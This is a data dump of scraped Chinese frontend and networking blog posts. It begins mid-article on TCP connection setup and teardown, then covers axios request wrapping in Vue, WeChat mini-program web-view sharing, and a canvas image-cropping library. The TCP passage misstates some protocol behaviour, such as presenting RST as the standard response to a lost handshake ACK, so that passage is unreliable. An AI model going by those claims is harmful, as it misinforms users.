包，这时候它会抛弃这个数据包，不会和服务端进行第三次握手，因此避免了服务端建立空的连接。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eACK 确认包丢失怎么办\u003c/h3\u003e\n\u003cp\u003e三次握手其实解决了第二步的数据包丢失问题。那么第三步的 ACK 确认丢失后，TCP 协议是如何处理的呢？\u003c/p\u003e\n\u003cp\u003e按照 TCP 协议处理丢包的一般方法，服务端会重新向客户端发送数据包，直至收到 ACK 确认为止。但实际上这种做法有可能遭到 SYN 泛洪攻击。所谓的泛洪攻击，是指发送方伪造多个 IP 地址，模拟三次握手的过程。当服务器返回 ACK 后，攻击方故意不确认，从而使得服务器不断重发 ACK。由于服务器长时间处于半连接状态，最后消耗过多的 CPU 和内存资源导致死机。\u003c/p\u003e\n\u003cp\u003e正确处理方法是服务端发送 RST 报文，进入 CLOSE 状态。这个 RST 数据包的 TCP 首部中，控制位中的 RST 位被设置为 1。这表示连接信息全部被初始化，原有的 TCP 通信不能继续进行。客户端如果还想重新建立 TCP 连接，就必须重新开始第一次握手。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e四次握手关闭连接\u003c/h3\u003e\n\u003cp\u003e这个过程可以用以下四句形象的对话表示：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e（客户端）：我要关闭连接了。\u003c/li\u003e\n\u003cli\u003e（服务端）：你那边的连接可以关闭了。\u003c/li\u003e\n\u003cli\u003e（服务端）：我这边也要关闭连接了。\u003c/li\u003e\n\u003cli\u003e（客户端）：你那边的连接可以关闭了。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e由于连接是双向的，所以双方都要主动关闭自己这一侧的连接。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e关闭连接的最后一个 ACK 丢失怎么办\u003c/h3\u003e\n\u003cp\u003e实际上，在第三步中，客户端收到 FIN 包时，它会设置一个计时器，等待相当长的一段时间。如果客户端返回的 ACK 丢失，那么服务端还会重发 FIN 并重置计时器。假设在计时器失效前服务器重发的 FIN 包没有到达客户端，客户端就会进入 CLOSE 状态，从而导致服务端永远无法收到 ACK 确认，也就无法关闭连接。\u003c/p\u003e\n\u003cp\u003e示意图如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"TCP 关闭连接\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/1604b4917affaab0?w=612\u0026amp;h=336\u0026amp;f=png\u0026amp;s=50147\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514949017.8012","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556ca"},"id":"59fd982c6fb9a045170490df","author":{"$oid":"5a4cc287fa7d97296c4556b9"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"在 vue-cli 里基于 axios 封装复用请求","meta":{"likeCount":0},"tag":["Vue.js","前端","axios"],"comment":[],"shortContent":"自从Vue2.0推荐大家使用 axios 开始，axios 被越来越多的人所了解。使用axios发起一个请求对大家来说是比较简单的事情，但是axios没有进行封装复用，项目越来越大，引起的代码冗余。就会非常麻烦的一件事。所以本文会详细的跟大家介绍，如何封装请求，并且在项目组件中…","content":"\u003ch2 class=\"heading\"\u003e写在前面：\u003c/h2\u003e\u003cp\u003e自从Vue2.0推荐大家使用 axios 开始，axios 被越来越多的人所了解。使用axios发起一个请求对大家来说是比较简单的事情，但是axios没有进行封装复用，项目越来越大，引起的代码冗余。就会非常麻烦的一件事。所以本文会详细的跟大家介绍，如何封装请求，并且在项目组件中复用请求。有需要的朋友可以做一下参考，喜欢的可以点波赞，或者关注一下，希望可以帮到大家。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文首发于我的个人blog：\u003ca href=\"http://obkoro1.com/\"\u003eobkoro1.com\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e安装\u003c/h3\u003e\u003cp\u003e只用安装一个axios就可以了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install axios --save \u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e接口代理设置\u003c/h3\u003e\u003cp\u003e为了请求可以正常发送，我们一般要进行一个接口代理的配置，这样可以避免请求跨域，项目打包之后，后端一般也要搭建一个nginx之类的东西进行转发请求，不然请求会因为跨域问题失败的。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//文件位置：config/index.js\nproxyTable: {\n  \u003cspan class=\"hljs-string\"\u003e'/api'\u003c/span\u003e: {\n    target: \u003cspan class=\"hljs-string\"\u003e'http://47.95.xxx.246:8080'\u003c/span\u003e,  // 通过本地服务器将你的请求转发到这个地址\n    changeOrigin: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,  // 设置这个参数可以避免跨域\n    pathRewrite: {\n      \u003cspan class=\"hljs-string\"\u003e'/api'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e\n    }\n  },\n},\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/31/3af73c621b7523aa0f3a2fd95d1bd38c\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e设置好了之后，当你在项目中要调用\u003ccode\u003ehttp://47.95.xxx.246:8080\u003c/code\u003e这个服务器里面的接口，可以直接用\u003ccode\u003e/api\u003c/code\u003e代替服务器地址。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e发起请求\u003c/h2\u003e\u003ch3 class=\"heading\"\u003emain.js入口文件中：\u003c/h3\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport axios from \u003cspan class=\"hljs-string\"\u003e'axios'\u003c/span\u003e;//引入文件\nVue.prototype.\u003cspan class=\"hljs-variable\"\u003e$http\u003c/span\u003e = axios;//将axios挂载到Vue实例中的\u003cspan class=\"hljs-variable\"\u003e$ajax\u003c/span\u003e上面,在项目中的任何位置通过this.\u003cspan class=\"hljs-variable\"\u003e$http\u003c/span\u003e使用\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e没有封装发起请求：\u003c/h3\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//没有封装的时候，在组件中发起请求的方式：\n   this.\u003cspan class=\"hljs-variable\"\u003e$ajax\u003c/span\u003e({\n       url:\u003cspan class=\"hljs-string\"\u003e'/api/articles'\u003c/span\u003e,//api 代理到json文件地址，后面的后缀是文件中的对象或者是数组\n       method:\u003cspan class=\"hljs-string\"\u003e'get'\u003c/span\u003e,//请求方式\n       //这里可以添加axios文档中的各种配置\n     }).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (res) {\n       console.log(res,\u003cspan class=\"hljs-string\"\u003e'成功'\u003c/span\u003e);\n     }).catch(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (err) {\n       console.log(err,\u003cspan class=\"hljs-string\"\u003e'错误'\u003c/span\u003e);\n     })\n//还可以像下面这么简写\n  this.\u003cspan class=\"hljs-variable\"\u003e$ajax\u003c/span\u003e.get(\u003cspan class=\"hljs-string\"\u003e'api/publishContent'\u003c/span\u003e).then((res) =\u0026gt; {\n   console.log(res,\u003cspan class=\"hljs-string\"\u003e'请求成功'\u003c/span\u003e)\n  },(err)=\u0026gt;{\n    console.log(err,\u003cspan class=\"hljs-string\"\u003e'请求失败'\u003c/span\u003e);\n  });\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e封装请求\u003c/h2\u003e\u003cp\u003e封装的时候，我通常喜欢把请求抽象成三个文件，文件位置放在src中，只要你能引用到，就没问题，如下图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/4/0eaae692ac8801448a0a7300206d6144\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e创建三个.js文件，里面我都很认真的注释了，我就直接贴图片了，在文末我把这三个文件的地址发出来，需要的小伙伴自取。\u003c/p\u003e\n\u003cp\u003efetch.js：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/5/3cd9e9f1ebe11929f940d567870b4ec9\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eurl.js:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/5/f70bfc90db9cb1c40725e179efbd4ab5\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eapi.js\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/5/250690aa2ca666b6ef48f69483731ae0\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e在组件里面如何使用接口：\u003c/h3\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/5/2ba68f2fad37c0285aeb0ba9e6e86a1e\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e封装axios文件地址在这里：\u003ca href=\"https://github.com/OBKoro1/article-demo/tree/master/2017/axios\"\u003e传送门\u003c/a\u003e\u003c/h3\u003e\u003cp\u003e代码注释什么的，已经蛮多了，跟着文章一步一步走，实现封装axios请求，没毛病的。本文并没有把很多功能都完整的列出来，主要是追求一个上手，剩下的东西，各位小伙伴们可以自行研究。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e最后\u003c/strong\u003e：如需转载，请放上原文链接并署名。码字不易，\u003cstrong\u003e感谢\u003c/strong\u003e支持！本人写文章本着交流记录的心态，写的不好之处，不撕逼，但是欢迎指点。然后就是希望看完的朋友点个\u003cstrong\u003e喜欢\u003c/strong\u003e，也可以\u003cstrong\u003e关注\u003c/strong\u003e一下我。\u003cbr\u003e\u003ca href=\"http://obkoro1.com/\"\u003eblog网站\u003c/a\u003e  and \u003cstrong\u003e\u003ca href=\"https://juejin.im/user/58714f0eb123db4a2eb95372\"\u003e掘金个人主页\u003c/a\u003e \u003c/strong\u003e  \u003c/p\u003e\n\u003cp\u003e以上2017.11.6\u003c/p\u003e\n","buildTime":"1514974026.7144","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556d4"},"id":"5a20f53d51882509e54378d5","author":{"$oid":"5a4cc287fa7d97296c4556c0"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"浅谈小程序内嵌网页及内嵌网页跳转分享实现","meta":{"likeCount":0},"tag":["JavaScript","前端","微信小程序"],"comment":[],"shortContent":"上个月，小程序开发内嵌web页面的功能，这个对于很多微信开发者都是个重大消息。最近两天，笔者项目中有这样一个需求，支持小程序内嵌网页，并且在内嵌网页中多次跳转，分享后，点开还是在跳转之后的网页。对于这样一个新技术，还是充满好奇，既然老大说了要做，那就尝试去做呗。 首先，当然是参…","content":"\u003cp\u003e上个月，小程序开发内嵌web页面的功能，这个对于很多微信开发者都是个重大消息。最近两天，笔者项目中有这样一个需求，支持小程序内嵌网页，并且在内嵌网页中多次跳转，分享后，点开还是在跳转之后的网页。对于这样一个新技术，还是充满好奇，既然老大说了要做，那就尝试去做呗。\n首先，当然是参考\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/debug/wxadoc/dev/component/web-view.html\"\u003e微信小程序的api\u003c/a\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eweb-view\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://mp.weixin.qq.com/\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eweb-view\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实使用起来特别简单，只需在页面中放入这样一个标签即可，其中src一定是要在小程序管理中心配置过的。特别注意一下，web-view会占满整个页面，不管这个页面有什么其它的东西，都不会展示出来。\u003c/p\u003e\n\u003cp\u003e好了。有了这个可以开始进入需求实现的阶段了。对于分享功能，做过小程序开发的都不会陌生，在需要被分享的页面js中加入onShareAppMessage这样一个事件即可。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在 Page 中定义 onShareAppMessage 函数，设置该页面的转发信息。\n只有定义了此事件处理函数，右上角菜单才会显示 “转发” 按钮\n用户点击转发按钮的时候会调用\n此事件需要 return 一个 Object，用于自定义转发内容\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e示例代码如下：\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ePage({\n  \u003cspan class=\"hljs-attr\"\u003eonShareAppMessage\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (res.from === \u003cspan class=\"hljs-string\"\u003e'button'\u003c/span\u003e) {\n      \u003cspan class=\"hljs-comment\"\u003e// 来自页面内转发按钮\u003c/span\u003e\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(res.target)\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'自定义转发标题'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/page/user?id=123'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003esuccess\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-comment\"\u003e// 转发成功\u003c/span\u003e\n      },\n      \u003cspan class=\"hljs-attr\"\u003efail\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-comment\"\u003e// 转发失败\u003c/span\u003e\n      }\n    }\n  }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是存在web-view时，onShareAppMessage回调函数参数res中还会多一个webViewUrl\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ePage({\n  onShareAppMessage(options) {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(options.webViewUrl)\n  }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看了这么多api，心里也有数了，就开始愉快的撸代码了。很快，内嵌网页分享的功能就是实现出来了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eonShareAppMessage(options) {\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e that = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e return_url = options.webViewUrl\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: that.data.title,\n        \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: return_url,\n        \u003cspan class=\"hljs-attr\"\u003esuccess\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n          that.web_url = return_url\n          \u003cspan class=\"hljs-comment\"\u003e// 转发成功\u003c/span\u003e\n          wx.showToast({\n            \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"转发成功\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eicon\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'success'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eduration\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e\n          })\n          \n        },\n        \u003cspan class=\"hljs-attr\"\u003efail\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n          \u003cspan class=\"hljs-comment\"\u003e// 转发失败\u003c/span\u003e\n        }\n      }\n    },\n    \u003cspan class=\"hljs-string\"\u003e``\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e`\n就在感叹自己是多么牛x，一下子就搞出来的时候，发现离需求还差一点。需要实现内嵌网页内多次跳转分享的功能，这就需要自己想办法了。在小程序分享中又不能保持状态，这个得去记录分享时网页的路径。其实有点开发经验的都能想到这个办法，那就是使用？在url后记录下来，这样在其它用户打开转发小程序的时候，取出其中的参数，将web-view中的src替换成这个就行了。话不多说，直接上代码。\n`\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e``\u003c/span\u003ejavascript\nPage({\n    \u003cspan class=\"hljs-attr\"\u003eweb_url\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003edata\u003c/span\u003e: {\n      \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'测试内嵌分享'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eurl\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eweb_src\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n    },\n    onShareAppMessage(options) {\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e that = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e return_url = options.webViewUrl\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e path = \u003cspan class=\"hljs-string\"\u003e'/page/test/test?return_url='\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(return_url)\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(path, options)\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: that.data.title,\n        \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: path,\n        \u003cspan class=\"hljs-attr\"\u003esuccess\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n          that.web_url = return_url\n          \u003cspan class=\"hljs-comment\"\u003e// 转发成功\u003c/span\u003e\n          wx.showToast({\n            \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"转发成功\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eicon\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'success'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eduration\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e\n          })\n        },\n        \u003cspan class=\"hljs-attr\"\u003efail\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n          \u003cspan class=\"hljs-comment\"\u003e// 转发失败\u003c/span\u003e\n        }\n      }\n    },\n    \u003cspan class=\"hljs-attr\"\u003eonLoad\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e pages=getCurrentPages();\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e currentPage = pages[pages.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e]; \n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e web_src = \u003cspan class=\"hljs-built_in\"\u003edecodeURIComponent\u003c/span\u003e(currentPage.options.return_url ||\n        \u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"你的内嵌网页网址\"\u003c/span\u003e))\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.web_url = web_src\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setData({\n          \u003cspan class=\"hljs-attr\"\u003eweb_src\u003c/span\u003e: web_src\n        }, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n          \n        });\n        \n    }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e写到这里，终于大功告成了。\n但是！！！\n测试出问题了！！！分享后跳不到想要的页面！！！\n找了n小时的bug，也看不出上面代码思路和实现有何问题。由于此项技术也刚发布不久，市面上几乎没有可以参考的文章，只能自己硬着头皮找。\n找啊找，终于在今天早上找到了这个坑。\n由于内嵌网页是单页面应用，在手机上测试的时候webViewUrl的获取每次都会出现问题，只有跳转方式换成一般的多页面应用的跳转方式，比如a标签href等跳转方式，而不是router-link这种方式（以vue为例），这个问题才不会出现。\n也不知道这是不是个微信的bug，总之需求实现了，还是很开心的。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e觉得笔者写得不错，可以点个赞哒！！！\u003c/strong\u003e\n\u003cstrong\u003e如果此文中有不对的地方，欢迎大家指正交流！！！\u003c/strong\u003e\u003c/p\u003e\n","buildTime":"1514971887.3425","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556d5"},"id":"5a0cff01518825592c07a766","author":{"$oid":"5a4cc287fa7d97296c4556c5"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"【开源】canvas图像裁剪、压缩、旋转","meta":{"likeCount":0},"tag":["Canvas","前端","开源","GitHub"],"comment":[],"shortContent":"前段时间遇到了一个移动端对图像进行裁剪、压缩、旋转的需求。 考虑到已有各轮子的契合度都不高，于是自己重新造了一个轮子。 在HTML5时代，canvas的功能已经非常强大了，可以进行像素级的操作。像图像裁剪、压缩就都是基于canvas来实现的。 关于其中原理，无非就是利用canv…","content":"\u003ch2 class=\"heading\"\u003e前言\u003c/h2\u003e\u003cp\u003e前段时间遇到了一个移动端对图像进行裁剪、压缩、旋转的需求。\u003cbr\u003e考虑到已有各轮子的契合度都不高，于是自己重新造了一个轮子。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e关于图像裁剪、压缩\u003c/h2\u003e\u003cp\u003e在HTML5时代，\u003ccode\u003ecanvas\u003c/code\u003e的功能已经非常强大了，可以进行像素级的操作。像图像裁剪、压缩就都是基于\u003ccode\u003ecanvas\u003c/code\u003e来实现的。\u003c/p\u003e\n\u003cp\u003e关于其中原理，无非就是利用\u003ccode\u003ecanvas\u003c/code\u003e自带的API，复杂一点的就是裁剪框以及旋转后的坐标计算，因此不再赘述。\u003c/p\u003e\n\u003cp\u003e本文中的图像裁剪、压缩都是基于\u003ccode\u003ecanvas\u003c/code\u003e完成的。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e图像裁剪\u003c/h2\u003e\u003cp\u003e功能包括：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003ecanvas\u003c/code\u003e绘制图片\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e裁剪框选择裁剪大小\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e旋转功能\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e放大镜（方便旋转）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e裁剪功能\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e缩放、压缩功能（通过参数控制）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e示例\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://dailc.github.io/image-process/examples/clip.html\"\u003ehttps://dailc.github.io/image-process/examples/clip.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/11/16/15fc2c418f22543b?w=334\u0026h=335\u0026f=png\u0026s=30222\"\u003e\u003cfigcaption\u003eimage\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e效果\u003c/h3\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/11/16/15fc2c4192c803f8?w=334\u0026h=587\u0026f=jpeg\u0026s=19846\"\u003e\u003cfigcaption\u003eimage\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/11/16/15fc2c4192bc9d77?w=334\u0026h=586\u0026f=jpeg\u0026s=20861\"\u003e\u003cfigcaption\u003eimage\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/11/16/15fc2c418f0f1c1e?w=334\u0026h=579\u0026f=jpeg\u0026s=20497\"\u003e\u003cfigcaption\u003eimage\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/11/16/15fc2c418f22cda7?w=334\u0026h=599\u0026f=jpeg\u0026s=9746\"\u003e\u003cfigcaption\u003eimage\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e[图片上传失败...(image-c687d7-1510800462845)]\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用\u003c/h3\u003e\u003cp\u003e引入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003edist/image-clip.css\ndist/image-clip.js\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e全局变量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003eImageClip\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e调用方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cropImage = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ImageClip(options);\n\ncropImage.method()\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAPI\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eresetClipRect\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e重置裁剪框，重新变为最大\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003ecropImage.resetClipRect();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eclip\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e裁剪图像，根据当前的裁剪框进行裁剪\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003ecropImage.clip();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003egetClipImgData\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e获取已裁剪的图像\u003c/p\u003e\n\u003cpre\u003e\u003ccode 